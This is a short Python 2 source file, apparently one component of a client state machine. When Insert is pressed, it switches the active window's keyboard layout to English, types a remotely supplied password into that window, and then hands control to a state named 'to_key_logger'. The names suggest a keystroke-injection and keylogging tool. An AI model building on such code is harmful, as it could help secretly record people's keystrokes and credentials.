"""
name:
date:
description
"""
import keyboard
import win32api
import win32gui

from client.window_order import shadow_fsm
from .state import State


class ShadowInserPasswordState(State):
    PASSWORD = None
    logger = None

    @classmethod
    def on_press(cls, *args):
        keyboard.wait('insert')
        print 'shadow insert password'
        if not cls.to_english() == 0:
            # shadow_fsm.dont_have_english()
            win32api.LoadKeyboardLayout('00000409')
            if not cls.to_english() == 0:
                return
        keyboard.write(cls.PASSWORD)
        shadow_fsm.to_key_logger()

    @classmethod
    def to_english(cls):
        window_handle = win32gui.GetForegroundWindow()
        return win32api.SendMessage(window_handle, 0x0050, 0, 67699721)

    @classmethod
    def get_data(cls, data):
        if 'password' in data:
            cls.PASSWORD = data['password']
        else:
            pass  # FIXME:
